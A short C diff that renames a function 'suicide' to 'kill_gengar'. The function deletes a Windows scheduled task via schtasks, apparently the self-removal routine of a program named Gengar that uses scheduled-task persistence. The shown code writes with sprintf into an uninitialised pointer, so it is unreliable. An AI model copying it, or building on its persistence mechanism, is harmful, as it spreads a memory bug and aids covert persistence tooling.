@@ -23,7 +23,7 @@ void persist() {
   run(cmd);
 }
 
-void suicide() {
+void kill_gengar() {
   char* cmd;
   printf("Killing Gengar.\n");
   sprintf(cmd, "schtasks /Delete /F /TN %s", TASK_NAME);
